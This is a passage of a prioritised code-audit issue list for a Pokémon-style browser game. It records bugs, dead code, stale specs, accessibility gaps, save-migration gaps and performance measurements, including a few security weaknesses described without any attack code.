- [ISSUE-194] [P2] Turn-loop median **23–38 ms / p95 35–53 ms / max 46–58 ms** in jsdom — production with `settings.animations=true` adds bounded `sleep()` delays on top, but the jsdom number IS the production floor when animations are off — `playTurn` (perf)
- [ISSUE-195] [P2] 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json` — `POKEMART_ITEMS` (data)
- [ISSUE-196] [P2] Mart/Dept consumables (30 ids: potion, xAttack, sunOrb, evResetCharm…) are a self-contained namespace, NOT entries in items.json — `POKEMART_ITEMS` (data)
- [ISSUE-197] [P2] `_storyBattleEntryBusy` can latch true on a cold-open / beat-scene continuation throw → soft-locks "Enter Gym / Continue Route" — `proceedToNextBattle` (bug)
- [ISSUE-198] [P2] City-0 starter pick is drawn from a pure-G4 (weakest tier) pool — `PROF_ROLLS` (balance)
- [ISSUE-199] [P2] Mystery swap picker mislabels BST grade as "Power tier (1-4)" — `profAccept` (inconsistency)
- [ISSUE-200] [P2] README calls catch / PC / Underground / Safari / boss-arc "upcoming"; all are shipped — `README` (inconsistency)
- [ISSUE-201] [P2] Catch screen result/throw text has no aria-live; outcomes silent to screen readers — `renderCatchScreen` (a11y)
- [ISSUE-202] [P2] City-hub Mystery Figure NPC sprite is hard-coded to Cyrus, ignoring `sm.mysteryIdentity` rotation — `renderCityActions` (bug)
- [ISSUE-203] [P2] Pokémon Center copy promises a "Heal" that no longer exists (full-heal is automatic) — `renderCityActions` (bug)
- [ISSUE-204] [P2] ISSUE-038 is marked fixed but `No Item` is still absent from items.json and 11 build slots still reference it — `resolveCsvBuildEntry` (inconsistency)
- [ISSUE-205] [P2] `_trainerPoolCache` is an unbounded Map (keyed on type+gens) with no eviction — Fight Club draft / story-pool variety will grow it without limit — `rollTrainerTeam` (perf)
- [ISSUE-206] [P2] Safari unlock spec'd "after badge 3 OR City3" but code (and REDESIGN) fix it firmly at City4 — `SAFARI_ENTRY_COST` (inconsistency)
- [ISSUE-207] [P2] safari-zone integration test gives false confidence — asserts stale hard-coded weights and matches "1.25" anywhere in the spec doc — `safari-zone.test` (dx)
- [ISSUE-208] [P2] STORY_MODE_FLOW pins SAVE_VER at 15/17; shipped SAVE_VER is 21 — `SAVE_VER` (inconsistency)
- [ISSUE-209] [P2] SAVE_VER stays at 19 despite an implicit v20 schema cleanup that runs on every load — `SAVE_VER` (dx)
- [ISSUE-210] [P2] SAVE_VER=23 but migration chain stops at PreV22 — no migrateStoryPreV23 step (v23 added wanderByEventIdx, back-filled unconditionally) — `SAVE_VER` (dx)
- [ISSUE-211] [P2] Pending Healing Wish / Lunar Dance flags bleed into next battle and auto-heal its lead — `selectPartyMember` (bug)
- [ISSUE-212] [P2] sellItem trusts caller-supplied sellPrice instead of re-deriving from the catalog — `sellItem` (bug)
- [ISSUE-213] [P2] 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging — `setBattleLogHtml` (dx)
- [ISSUE-214] [P2] Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS — `setDisplayName` (security)
- [ISSUE-215] [P2] settings.animations defaults to true and is never seeded from prefers-reduced-motion — `settings-animations-init` (a11y)
- [ISSUE-216] [P2] Anomaly seeds fire via low-z `showGameAlert` on the same tick as the row's flow — can paint behind/over other overlays — `showGameAlert` (inconsistency)
- [ISSUE-217] [P2] showGameConfirm overwrites a pending _gameConfirmResolve, orphaning the first awaiter — `showGameConfirm` (bug)
- [ISSUE-218] [P2] anime.js move-FX engine ignores prefers-reduced-motion — heaviest motion bypasses the CSS catch-all — `showMoveEffect` (a11y)
- [ISSUE-219] [P2] Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored — `showVictoryOverlay` (a11y)
- [ISSUE-220] [P2] Fresh run starts with 0 Poké Balls; skipping the optional City-0 Mart silently no-ops the catch tutorial — `startNewRun` (bug)
- [ISSUE-221] [P2] Achievements `caged_god` / `r_caged_god` are permanently unobtainable (dead arc) — `STORY_ACHIEVEMENTS` (inconsistency)
- [ISSUE-222] [P2] Caged God achievements (caged_god, r_caged_god) are permanently unearnable after v24 arc cut — `STORY_ACHIEVEMENTS` (inconsistency)
- [ISSUE-223] [P2] STORY_MODE_FLOW says timeline is "68 rows"; STORY_EVENTS_RAW actually has 67 rows — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-224] [P2] Story spine is a hardcoded linear array; narrative layer is data-driven but no structural side-story/random-pool slots — `STORY_EVENTS_RAW` (refactor)
- [ISSUE-225] [P2] Recurring facility-flavor pool covers 8 services; Safari / Stone Sage / Stone Shop / Dept Store have none — `STORY_FACILITY_QUOTES` (inconsistency)
- [ISSUE-226] [P2] De-scoped features (Black Market, Illegal Dealer, Trader, Wager, full Itinerary) still presented as active spec — precise doc-edit list — `STORY_FEATURES_INTEGRATION` (dx)
- [ISSUE-227] [P2] Surviving canonical specs + code link to docs deleted in the cleanup (dangling references) — `STORY_MODE_FLOW` (inconsistency)
- [ISSUE-228] [P2] Story tone variants recolor nameplate text but not its yellow background — fails WCAG AA contrast — `story-dialog-nameplate` (a11y)
- [ISSUE-229] [P2] Story dialogue/NPC quote text is not in a live region — narration is silent to screen readers — `story-dialog-text` (a11y)
- [ISSUE-230] [P2] Verbatim gold-HUD markup re-inlined 11× — the "re-inlined block 25 times" anti-pattern CLAUDE.md warns about — `story-gold-icon` (refactor)
- [ISSUE-231] [P2] Help screen still advertises the cut Caged God / Subject Zero / Master-Ball quest — `storyHelpText` (inconsistency)
- [ISSUE-232] [P2] STORY_NARRATIVE_VARIANTS.md presents a cut 8-variant design as "canonical" (future-prompt-rebuild trap) — `STORYLINE_VARIANTS` (inconsistency)
- [ISSUE-233] [P2] Cosmetic-skin roll references bare `sm` AND bare `storyRngNext` — double scope leak, never seeded — `storyRngNext` (inconsistency)
- [ISSUE-234] [P2] 351 it.todo() stubs across 3 move-category test files — cluster enumeration — `tests/moves/by-category` (test-gap)
- [ISSUE-235] [P2] 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool — `TRAINER_QUOTES_BY_NAME` (inconsistency)
- [ISSUE-236] [P2] Trick / Switcheroo swap is one-directional — the user's item is destroyed — `Trick` (bug)
- [ISSUE-237] [P2] Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing — `type-badge` (a11y)
- [ISSUE-238] [P2] Long story replay shows steady, non-plateauing heap growth (~22–67 KB/turn, R²=0.99 over 250 battles) driven by per-turn / per-distinct-foe DOM scaffolding that GC + reset() do not reclaim — `updateBattleUI` (perf)
- [ISSUE-239] [P2] Long story replay shows linear (non-quadratic) heap + DOM-node growth that does not plateau — ~0.275 MB and ~52 sprite-container nodes retained per battle — `updateBattleUI` (perf)
- [ISSUE-240] [P2] STORY_3TRACK_IMPL_PLAN reads as a forward plan but is mostly SHIPPED — only PR-1 marked done — `VILLAIN_STORY_BEATS` (inconsistency)
- [ISSUE-241] [P2] EVOLUTION_FLOW_REBUILD.md header says "Status: Plan — review before implementation" but the system fully shipped — `VOUCHER_KEYS` (inconsistency)
- [ISSUE-242] [P3] Modals have aria-modal + Escape but no Tab focus trap — keyboard focus can leave the dialog — `__pbsGlobalEscBound` (a11y)
- [ISSUE-243] [P3] Heal phase (+25% maxHp) can push a raid boss back ABOVE the HP threshold the player just crossed — `_applyBossPhaseEffect` (inconsistency)
- [ISSUE-244] [P3] Dual story-vs-Frontier path in `_applyStoryBuildPowerTier` is mutually exclusive and safe — legacy branch is NOT removable (in-scope MF needs it) — `_applyStoryBuildPowerTier` (inconsistency)
- [ISSUE-245] [P3] Lead→city mapping duplicated (`_BOSS_LEAD_CITIES` const vs inline `_leadCity` literal) — `_BOSS_LEAD_CITIES` (inconsistency)
- [ISSUE-246] [P3] Caged God uses three names for one entity (Specimen 0001 / Subject Zero / Subject 0001) without a stated rule — `_bossArcCheckCageUnlock` (inconsistency)
- [ISSUE-247] [P3] _bossArcRenderSection rebuilt in full inside every _renderCrucible re-render (adds ~6ms of the 30ms) — `_bossArcRenderSection` (perf)
- [ISSUE-248] [P3] Non-hub Caged God render path is effectively dead post-HoF (player can never be at City 2/5/8) — `_bossArcRenderSection` (design)
- [ISSUE-249] [P3] Entire Caged God boss-arc subsystem is dead code after v24 removal — `_bossArcRenderSection` (refactor)
- [ISSUE-250] [P3] Solo-raid HP is 6.5× base, not the documented (maxParty-1)=5× — stat-mult and HP-scale compound on HP — `_bossHpScaleForKind` (inconsistency)
- [ISSUE-251] [P3] CONFIRMED CLEAN — PC overflow at party-cap + 30/30 shows explicit message; sell/release path exists — `_catchHandleSuccess` (bug)
- [ISSUE-252] [P3] Eggs occupy a party slot against the catch/withdraw cap but foe size matches only non-egg fighters — eggs silently shrink your catchable roster AND your opponent — `_catchHandleSuccess` (inconsistency)
- [ISSUE-253] [P3] Regular wild encounter with zero balls shows greyed buttons but no "out of balls" message — `_catchRender` (dx)
- [ISSUE-254] [P3] Variant Champion / rival dialogue narratively routes player to the dead broker + cage — `_CHAMPION_DIALOGUE_BY_VARIANT` (inconsistency)
- [ISSUE-255] [P3] "Free" badge wording inconsistent — "1st Free" vs "Free" vs "Claimed" vs "Locked" — `_costBadge` (inconsistency)
- [ISSUE-256] [P3] 9 Gen-2-legacy "isBerry" items are dead data — no engine handler and never referenced by any build — `_onBerryEaten` (data)
- [ISSUE-257] [P3] Dead CSS selector #story-pc-tab-journal-btn — no such tab button exists in the Poké Center — `_pcRefresh` (dx)
- [ISSUE-258] [P3] `_pendingProfRoll` (singular) only ever assigned null — dead variable shadowing live `_pendingProfRolls` — `_pendingProfRoll` (refactor)
- [ISSUE-259] [P3] Inert `_permBoostsRead`/`_permBoostTotal` stubs (+ window export) have zero callers — fully dead — `_permBoostsRead` (refactor)
- [ISSUE-260] [P3] `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads — `_pickCityQuoteLine` (inconsistency)
- [ISSUE-261] [P3] Variant roll + Mystery identity use bare `Math.random()` at run construction — non-deterministic across seeded replays — `_pickRandomStorylineVariant` (bug)
- [ISSUE-262] [P3] League-road narrative "clumping" — 6 story beats fire back-to-back before the Champion (the audit §4 flow bug, still unfixed in the live path) — `_playStoryBeatQueue` (inconsistency)
- [ISSUE-263] [P3] Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images — `_preloadedImages` (perf)
- [ISSUE-264] [P3] Casino debits floor gold at Math.max(0, gold-bet), which would silently mask a future bet-validation regression — `_refreshCasinoGoldPill` (dx)
- [ISSUE-265] [P3] Crucible "Pokémon Center" facility re-renders the Caged God section a second time (below the Underground sell list) — `_renderCrucible` (design)
- [ISSUE-266] [P3] Grade badge prefix differs between prof pick cards (G#) and swap slots (T#) — `_renderProfChoices` (inconsistency)
- [ISSUE-267] [P3] "Reveal lands inside first ~10 minutes" comment is wrong — first villain beat is post-Gym-2 (road2) — `_ROAD_BY_ARRAY_IDX` (inconsistency)
- [ISSUE-268] [P3] Safari curve key [3] ("first unlock") is dead code — Safari actually unlocks at 4 badges, so first visit uses the harsher [4] curve — `_SAFARI_GRADE_CURVE_BY_BADGES` (inconsistency)
- [ISSUE-269] [P3] Safari grade weights are a per-badge curve in code, but STORY_MODE_FLOW.md §4 still specs the old flat g1:3/g2:22/g3:50/g4:25 — `_SAFARI_GRADE_CURVE_BY_BADGES` (inconsistency)
- [ISSUE-270] [P3] Safari grade weights are now badge-keyed — spec/CODEBASE_MAP still cite the old static g1:3/g2:22/g3:50/g4:25 — `_safariGradeWeightsForBadges` (inconsistency)
- [ISSUE-271] [P3] Safari grade weights diverge from the canonical spec (`g1:3/g2:22/g3:50/g4:25`) — code is a badge-staged curve; spec is stale — `_safariGradeWeightsForBadges` (data)
- [ISSUE-272] [P3] CONFIRMED CLEAN — catch tutorial fires exactly once; mid-tutorial reload cannot refire or lock — `_shouldFireCatchTutorialBeforeBattle` (bug)
- [ISSUE-273] [P3] Post-HoF orientation tip frames the Mystery Figure as un-fought, but the row-67 climax already unmasked it — `_showOrientationTipThenCity` (inconsistency)
- [ISSUE-274] [P3] CORRECTION to prior audit: storyline variant is rolled randomly every run, NOT forced to 'classic' — `_storyActiveVariant` (dx)
- [ISSUE-275] [P3] faintPhase counts the active foe as "fainted" mid-tick if it is at 0 HP before the swap — `_storyBossMechanicsTurnTick` (bug)
- [ISSUE-276] [P3] bossMechanicsTurnTick per-turn cost is ~1.5us (foeParty.filter is NOT wasteful); only _showBossBanner DOM is non-trivial and fires ~5x/battle — `_storyBossMechanicsTurnTick` (perf)
- [ISSUE-277] [P3] Redundant tier branches in `_storyBuildTierForEvent` (dead duplicate conditions) — `_storyBuildTierForEvent` (refactor)
- [ISSUE-278] [P3] `_storyBuildTierForEvent` Basic-Trainer branch has a dead `b>=5` arm — route fodder jumps T2→T4 at post-game with no T3 step (half-applied curve edit) — `_storyBuildTierForEvent` (bug)
- [ISSUE-279] [P3] "wild < gym staff" ladder is violated — Basic Trainer and Gym Trainer 1 share the SAME tier at every badge count — `_storyBuildTierForEvent` (inconsistency)
- [ISSUE-280] [P3] Basic Trainer build-tier ladder collapses at Stage 2 — same tier as Gym Trainers despite the "one tier below" comment — `_storyBuildTierForEvent` (balance)
- [ISSUE-281] [P3] `_storyEnemyMechKeys` doesn't guard against missing `sm.settings` — could throw on a malformed save — `_storyEnemyMechKeys` (dx)
- [ISSUE-282] [P3] Mystery Figure sprite is now `Red` (the_first); the `'Cyrus'` fallback at enterBattleEvent is dead — `_storyEnsureMysteryIdentity` (inconsistency)
- [ISSUE-283] [P3] Stale comment on `_storyGrantTrackEndReward` — claims scene-queue piggy-back that is structurally impossible — `_storyGrantTrackEndReward` (dx)
- [ISSUE-284] [P3] Extra-track raid EXP-Share reward + boss BOSS_MECHANICS are partly data-only — engine wiring deferred (mechanics are no-ops that only record) — `_storyGrantTrackEndReward` (dx)
- [ISSUE-285] [P3] CONFIRMED CLEAN — party-cap curve = min(6, 2+badges) with no off-by-one; foe sizing matches — `_storyMaxPartySize` (bug)
- [ISSUE-286] [P3] Legacy storyline picker is dead UI — hidden DOM + uncalled renderer + unreachable card handlers, superseded by sm.tracks — `_tcRenderStorylineGrid` (refactor)
- [ISSUE-287] [P3] `_validateTrainerData` logs a success `console.log` on every boot (ungated) — `_validateTrainerData` (dx)
- [ISSUE-288] [P3] Variant rival quote pools are uneven — several phases have a single line; many phases absent — `_VARIANT_RIVAL_QUOTES` (refactor)
- [ISSUE-289] [P3] Wild grade keyed on CITY (STORY_WILD_GRADE_BY_CITY), not badges — spec §3/§15f say _WILD_GRADE_CURVE_BY_BADGES (which does not exist) — `_wildGradeWeightsForCity` (inconsistency)
- [ISSUE-290] [P3] CONFIRMED CLEAN — mechanics unlock gate has no leak on any player or enemy path — `_withStoryPlayerGimmickGate` (bug)
- [ISSUE-291] [P3] items.json defines 93 mega stones but the engine recognizes only 51 — 45 non-canonical stones are inert data — `ALL_MEGA_STONES` (data)
- [ISSUE-292] [P3] Anomaly seeds are keyed by row ID but several land on mismatched event types vs their prose — `ANOMALY_SEEDS` (data)
- [ISSUE-293] [P3] Latent state-bleed: artifact battle-flags reset is behind an empty-artifacts early-return (same init-inside-guard shape as the fixed boss-bleed) — `applyArtifactBattleEffects` (bug)
- [ISSUE-294] [P3] `applyFoeDifficultyScaling`'s "additive league boost" comment narrates a fix that was never implemented — `applyFoeDifficultyScaling` (dx)
- [ISSUE-295] [P3] Spec §8 says league boost stacks multiplicatively with difficulty; code now stacks additively (the cliff was fixed) — `applyFoeDifficultyScaling` (inconsistency)
- [ISSUE-296] [P3] Spec §8 says league boost stacks MULTIPLICATIVELY with difficulty; code now stacks ADDITIVELY — `applyStoryLeagueFoeStatBoost` (inconsistency)
- [ISSUE-297] [P3] Magma/Aqua bosses flash the same telegraph banner twice in the first two turns — `BOSS_CONFIGS` (inconsistency)
- [ISSUE-298] [P3] `BOSS_MECHANICS` stub object is dead (never called); its "engine wiring is a no-op" comment is now false — `BOSS_MECHANICS` (dx)
- [ISSUE-299] [P3] `BOSS_MECHANICS` registry (`~42172`) is dead — pushes to `battle._mechanics`, which is never read — `BOSS_MECHANICS` (refactor)
- [ISSUE-300] [P3] Dead `build.tired` fatigue field still written/backfilled at 5 sites, read in zero gameplay paths — `build.tired` (refactor)
- [ISSUE-301] [P3] Extra-raid stat scaling compounds `_storyStatMult` × `_bossStatMult` × `_bossHpScale`; the doc comment omits `_storyStatMult` — `buildPokemon` (inconsistency)
- [ISSUE-302] [P3] buyItem cheap-consumable path is unguarded but synchronous; only the confirm-gated branch can interleave — `buyItem` (inconsistency)
- [ISSUE-303] [P3] Achievements caged_god / r_caged_god are permanently unobtainable — `caged_god` (data)
- [ISSUE-304] [P3] Roulette doc comment promises a color-row payout the code never pays — `casinoRoulSpin` (inconsistency)
- [ISSUE-305] [P3] Integration test asserts stale "PC cap of 10" and never checks the real PC_BOX_CAP=30 — `catch-system.test.js` (dx)
- [ISSUE-306] [P3] `sm.catchUnlocked` is written by migration + newStoryRun but never read anywhere — `catchUnlocked` (dx)
- [ISSUE-307] [P3] sm.catchUnlocked written by defaults + v15 migration + newStoryRun but read nowhere (live gate is sm.catchTutorialDone) — `catchUnlocked` (dx)
- [ISSUE-308] [P3] CHAMPION_VICTORY_LINES['Hau'] is dead — Hau is an Elite Trainer, never a Champion — `CHAMPION_VICTORY_LINES` (inconsistency)
- [ISSUE-309] [P3] CHANGELOG 2026-05-21 entry claims Cable Link is ungated but the implementation in v18 explicitly gates it — `CHANGELOG` (inconsistency)
- [ISSUE-310] [P3] `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented — `createRoom_23505` (refactor)
- [ISSUE-311] [P3] Crucible rematch pickers use bare Math.random — breaks the seeded-replay contract for post-game — `crucibleGymPick` (design)
- [ISSUE-312] [P3] ELITE_VICTORY_LINES['Molayne'] is dead — Molayne is an Elite Trainer, not an E1–E4 boss — `ELITE_VICTORY_LINES` (inconsistency)
- [ISSUE-313] [P3] Leech Seed drain is processed AFTER burn/poison/toxic damage (canon order is before) — `endOfTurnEffects` (bug)
- [ISSUE-314] [P3] Relic Annex intro uses plain-text `_storyShowOneTimeTip`; every other facility uses a sprite-backed scene — `enterArtifactShop` (inconsistency)
- [ISSUE-315] [P3] enterArtifactShop and enterShop lack the _storyTryBeginInteraction guard used by other facility entries — `enterArtifactShop` (dx)
- [ISSUE-316] [P3] City0 welcome tip says the Underground "buys … never your starter" but starters are sellable — `enterCity` (inconsistency)
- [ISSUE-317] [P3] Crucible sub-sections improve wayfinding but the orientation tip + "Mystery vs Caged God" disambiguation still lean on long alert text — `enterCrucible` (design)
- [ISSUE-318] [P3] Poké Center chip sits in "Heal & Team" section with a "Free" badge but performs no heal interaction — `enterPokemonCenter` (inconsistency)
- [ISSUE-319] [P3] Story facility regions use weak lowercase aria-labels ("story pokemoncenter", "story link") — `enterPokemonCenter` (dx)
- [ISSUE-320] [P3] `enterProfessor` duplicates gimmick-gate logic inline instead of using `_withStoryPlayerGimmickGate` — `enterProfessor` (dx)
- [ISSUE-321] [P3] `enterProfessor` reuses `_pendingProfChoices` across city visits at the same cityIdx — stale picks may persist past spec'd one-shot pool — `enterProfessor` (bug)
- [ISSUE-322] [P3] Professor flavor quote uses bare Math.random(), breaking seeded replay determinism — `enterProfessor` (bug)
- [ISSUE-323] [P3] Empty-choices Professor path shows status but renders no body buttons — `enterProfessor` (bug)
- [ISSUE-324] [P3] Exp Share Voucher item (3TRACK_IMPL_PLAN PR-5) never shipped; `sm.inventory.expShareVoucher` is dead init — `expShareVoucher` (inconsistency)
- [ISSUE-325] [P3] `expShareVoucher:0` inventory field is dead — no reader, no writer; extra-raid reward grants vitamins instead — `expShareVoucher` (data)
- [ISSUE-326] [P3] Service-availability timeline reference (Task 1 deliverable) — first-appearance / reappear / unlock map — `FACILITY_DEBUT_CITY` (data)
- [ISSUE-327] [P3] Crucible-reachable Frontier surrender uses raw window.confirm — drops fullscreen, breaks modal convention — `frontierSurrender` (dx)
- [ISSUE-328] [P3] Gauntlet score readout is a plain div with no live region — score changes are silent to SR — `gauntlet-score` (a11y)
- [ISSUE-329] [P3] Paralysis tooltip says "Speed quartered" but engine halves speed (0.5) — stale Gen 1-6 text vs Gen 7+ behavior — `getDownStatusLabel` (inconsistency)
- [ISSUE-330] [P3] Rival phase enum skips 1 (EARLY rival returns phase 2), leaving a dead phase-1 dialogue pool — `getRivalEncounterPhase` (inconsistency)
- [ISSUE-331] [P3] Sprite preload cache `_preloadedImages` is still an unbounded Object with no eviction — every distinct (name, shiny, back) pins an Image() for the session — `getSprite` (perf)
- [ISSUE-332] [P3] Two disjoint "beat" systems — row-id `STORY_BEATS` (cold-opens) vs sceneKey `*_STORY_BEATS` (3-track) — `getStoryBeatForRow` (refactor)
- [ISSUE-333] [P3] Featured Mega/Ultra stones (bought one-per-city at 5x/3x) are sellable from the bag at half list price — `getStoryFeaturedItems` (dx)
- [ISSUE-334] [P3] Grass Whistle never puts the target to sleep — `Grass Whistle` (bug)
- [ISSUE-335] [P3] CONFIRMED FIXED — GYM_CITY_LEADER_EVENT is now derived from STORY_EVENTS_RAW at boot (prior audit 1.3) — `GYM_CITY_LEADER_EVENT` (bug)
- [ISSUE-336] [P3] `isPokeball` flag set on 28 items but never read by the engine — dead metadata — `isPokeball` (data)
- [ISSUE-337] [P3] 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler — `items.json` (data)
- [ISSUE-338] [P3] `delete sm.casinoCoins` cleanup runs on every load, not gated by `_loadedVer` — `load` (bug)
- [ISSUE-339] [P3] CONFIRMED CLEAN — full migrate chain v8→v21 round-trips pre-v15 saves without crash or party/PC/badge loss — `load` (bug)
- [ISSUE-340] [P3] Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target** — `loadEngine` (perf)
- [ISSUE-341] [P3] Test-harness docs promise window.SAVE_VER / window.sm / window.newStoryRun but only StoryMode + __storyLoad are exposed — `loadEngine` (dx)
- [ISSUE-342] [P3] `console.log` cluster in battle.html — debug noise in shipped code — `loadGameData` (dx)
- [ISSUE-343] [P3] Cold boot is ~3.0 s in jsdom (5-process median 3009 ms) — within the harness's relaxed 5 s self-target but 15× the mandate's 200 ms; a target-mismatch to resolve, not a regression — `loadGameData` (perf)
- [ISSUE-344] [P3] Grade badge prefix differs — `G{tier}` on draft cards vs `T{grade}` on swap/daycare slots — `makeActionBtn` (inconsistency)
- [ISSUE-345] [P3] Button label patterns inconsistent — Professor uses verb+noun, all others noun-only; Evolution facility has 3 names — `makeActionBtn` (inconsistency)
- [ISSUE-346] [P3] Empty-state copy varies across facilities for the same "no party member" condition — `makeActionBtn` (inconsistency)
- [ISSUE-347] [P3] 7 build abilities (Telepathy/Mountaineer/Friend Guard/Healer/Pickup/Rebound/Symbiosis) are silent no-ops the engine never implements — `makeBuild` (data)
- [ISSUE-348] [P3] `makeBuild` is flat across power tiers (T1-T4 spread <0.04 ms median) — confirms no per-tier pathology; baseline 0.045 ms median — `makeBuild` (perf)
- [ISSUE-349] [P3] v15 stable-ID migration only iterates `sm.team`, not `sm.pcBox` (harmless today but inconsistent with v17) — `migrateStoryPreV15` (dx)
- [ISSUE-350] [P3] Pre-v15 saves get 0 Poké Balls instead of the intended 5 — migrateStoryPreV15 balls default is shadowed by the default sm object — `migrateStoryPreV15` (bug)
- [ISSUE-351] [P3] Catch-tutorial migration hard-codes intro-rival index (>1) instead of deriving it — `migrateStoryPreV16` (inconsistency)
- [ISSUE-352] [P3] catchTutorialDone migration hardcodes eventIndex>1 instead of deriving the intro-rival row — `migrateStoryPreV16` (dx)
- [ISSUE-353] [P3] catchTutorialDone migration hard-codes `eventIndex > 1` instead of deriving the intro-rival array index — `migrateStoryPreV16` (dx)
- [ISSUE-354] [P3] Online Host/Join form labels are not programmatically associated with their inputs — `modal-online-host` (a11y)
- [ISSUE-355] [P3] STORY_MODE_FLOW §14d describes Mystery Figure's 7-identity flow + Caged God repurpose; code has only the_first — `MYSTERY_FIGURE_IDENTITIES` (inconsistency)
- [ISSUE-356] [P3] CONFIRMED FIXED — Mystery Figure is now a rotating 10-identity cast (prior audit: hardcoded Cyrus) — `MYSTERY_FIGURE_IDENTITIES` (inconsistency)
- [ISSUE-357] [P3] `mysteryBias` per-variant config is orphaned — seeds weights for retired MF identities, never read — `MYSTERY_FIGURE_IDENTITIES` (data)
- [ISSUE-358] [P3] Mystery Figure rotating-cast scaffolding is now vestigial — collapsed to a single hard-locked identity "the_first" — `MYSTERY_FIGURE_IDENTITIES` (refactor)
- [ISSUE-359] [P3] Fresh runs start with 0 Poké Balls; spec §1/§10 say 5 (only migrated saves get 5) — `newStoryRun` (inconsistency)
- [ISSUE-360] [P3] A cluster of form controls lack accessible names (online host/join, casino bet, gauntlet opt-in) — `online-host-format` (a11y)
- [ISSUE-361] [P3] `parseCSV` of `data/builds.csv` (2.6 MB, 17,397 rows) blocks the main thread for **180 ms median** during boot — `parseCSV` (perf)
- [ISSUE-362] [P3] `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median — `parseMoveEffects` (perf)
- [ISSUE-363] [P3] `parseMoveEffects` per-move latency varies ~257× (median 0.012 ms, slowest 3.19 ms) — multi-stat-boost / "dance" moves are the outliers — `parseMoveEffects` (perf)
- [ISSUE-364] [P3] `parseMoveEffects` re-allocates 19 constant `Set` literals on every call and pays a 2–14 ms one-time JIT cost on first touch of each branch (warm cost is fine at ~0.01 ms) — `parseMoveEffects` (perf)
- [ISSUE-365] [P3] parseMoveEffects per-move spread is 130x (stat-stage moves ~1.3ms vs 0.01ms median) — benign, multiple changeStage calls — `parseMoveEffects` (perf)
- [ISSUE-366] [P3] Burn applied as final-damage multiplier (`modifier *= 0.5`) instead of halving the attack stat pre-floor — `parseMoveEffects-burn-modifier` (inconsistency)
- [ISSUE-367] [P3] Stat-change status moves (Decorate, Coaching, Baby-Doll Eyes, Calm Mind) are 50–100× slower than damage moves — `changeStage` calls `logMsg` 1–3× per stat tick, each hitting the 903-key tooltipDict scan — `parseMoveEffects-changeStage-tooltipScan` (perf)
- [ISSUE-368] [P3] Hand-quantification of parseMoveEffects Set-literal churn — 18 `new Set([...])` per call, 13 μs of pure allocation per call (≈70% of warm 18 μs median) — `parseMoveEffects-sets-warm` (perf)
- [ISSUE-369] [P3] Several status moves have no observable effect in the battle engine — `Power Shift` (bug)
- [ISSUE-370] [P3] 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded — `prefers-reduced-motion` (a11y)
- [ISSUE-371] [P3] proceedToNextBattle guards on total team length, but the launch path guards on non-egg fighter count — an all-egg party advances eventIndex then bounces — `proceedToNextBattle` (bug)
- [ISSUE-372] [P3] proceedToNextBattle "no Pokémon" guard counts eggs (team.length) while the fight launch counts only fighters — egg-only party advances then bounces — `proceedToNextBattle` (inconsistency)
- [ISSUE-373] [P3] Mystery-mode Accept has no double-submit guard (re-renders swap picker on repeat clicks) — `profAccept` (bug)
- [ISSUE-374] [P3] Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost — `randomCode` (bug)
- [ISSUE-375] [P3] README calls shipped catch / PC / Underground / Safari / boss-arc systems "upcoming" — `README.md` (dx)
- [ISSUE-376] [P3] Nature Rater availability is gappy (C0, C3, C5–C9) — absent C1/C2/C4 with no unlock rationale — `renderCityActions` (balance)
- [ISSUE-377] [P3] Rival-gate tip labelled "Heal …" deep-links to the Poké Center, which performs no heal — `renderCityActions` (dx)
- [ISSUE-378] [P3] Dead `'Cyrus'` Mystery-Figure sprite fallbacks remain after the identity was collapsed to a single value ('the_first' / Red) — `renderCityActions` (refactor)
- [ISSUE-379] [P3] Party count chip shows "(N/6)" regardless of the actual badge-driven cap — `renderTeamPanel` (bug)
- [ISSUE-380] [P3] CONFIRMED FIXED — RIVAL_ATTACK_TYPE_DECAY is now 10 (prior audit 1.2 had ÷30 too-aggressive) — `RIVAL_ATTACK_TYPE_DECAY` (balance)
- [ISSUE-381] [P3] Mystery Figure intro pool fallback uses 2 lines but the identity's `intros` field has 4 — falls back silently if the identity object lacks `intros` — `rollMysteryFigureFinalBossTeam` (bug)
- [ISSUE-382] [P3] Mystery Figure climax boss has ZERO gimmicks if the player disabled all 4 mechanics at run start — the "force all on" ctx is dead-coded — `rollMysteryFigureFinalBossTeam` (inconsistency)
- [ISSUE-383] [P3] `rollTrainerTeam` cold-call is **1.63 ms median (max 3.22 ms)**; well under the 50 ms target but worth recording as the deep-dive baseline before the upcoming difficulty-curve work — `rollTrainerTeam` (perf)
- [ISSUE-384] [P3] Safari flee-risk surfaced in color (orange #ff7043) and small 10px text only — `safariActionRow` (contrast)
- [ISSUE-385] [P3] Move-test generator strips apostrophes, and the engine silently runs unknown move names as a 187-dmg fallback — `safeName` (dx)
- [ISSUE-386] [P3] SAVE_VER=23 but migration chain stops at `_loadedVer < 22` — no migrateStoryPreV23, no boot shadow-validation — `SAVE_VER` (dx)
- [ISSUE-387] [P3] All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"` — `screen-landmarks` (a11y)
- [ISSUE-388] [P3] Several story-mode dev seeds use `Math.random` for build / sprite picks, breaking seeded replays when debug seeds are in play — `seedDebugMysteryLegendGate` (bug)
- [ISSUE-389] [P3] End-of-turn residual logic is duplicated verbatim in forced-switch path and main loop — divergence risk — `selectPartyMember` (inconsistency)
